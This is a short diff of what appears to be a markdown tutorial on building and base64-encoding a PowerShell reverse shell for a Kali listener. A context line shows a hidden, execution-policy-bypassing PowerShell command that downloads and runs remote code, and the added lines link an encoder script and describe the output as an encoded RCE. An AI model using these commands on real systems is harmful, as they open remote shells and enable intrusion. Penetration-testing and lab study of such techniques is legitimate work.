@@ -31,6 +31,7 @@ powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebCli
     
    ---
 ## **Steps to Encode the Reverse Shell**
-The Python code encodes the PowerShell reverse shell to base64 contained in the payload variable and then prints the result to standard output.
+The [Python code](https://raw.githubusercontent.com/MGamalCYSEC/ReverseShellCrafter/refs/heads/main/PowerShell/encode.py) encodes the PowerShell reverse shell to base64 contained in the payload variable and then prints the result to standard output.
 Replace `<kali_ip>` with your Kali machine's IP address and `<port>` with the same port you used for the listener.
+We can run it and retrieve the output to use it as an encoded RCE
 
